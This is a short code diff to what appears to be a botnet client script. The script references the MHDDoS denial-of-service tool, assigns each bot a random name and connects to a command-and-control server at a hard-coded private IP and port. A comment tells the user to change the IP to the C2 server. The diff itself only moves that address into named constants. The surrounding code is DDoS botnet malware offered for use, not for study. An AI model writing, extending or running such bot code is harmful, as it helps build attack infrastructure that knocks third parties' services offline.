@@ -9,12 +9,14 @@ import uuid
 
 CUR_DIR = os.path.dirname(os.path.realpath(__file__))
 MHDDoS = os.sep + 'MHDDoS' + os.sep + 'start.py'
+TEST_CNC = "10.11.45.53"
+TEST_CNC_PORT = 9999
 
 async def start_bot():
     bot_name = 'bot-' + str(uuid.uuid4())
     # change IP to cnc server
     try:
-        reader, writer = await asyncio.wait_for(asyncio.open_connection('10.11.45.53', 9999),
+        reader, writer = await asyncio.wait_for(asyncio.open_connection(TEST_CNC, TEST_CNC_PORT),
                                                 timeout=5)
     except asyncio.TimeoutError:
         print('connect timeout')
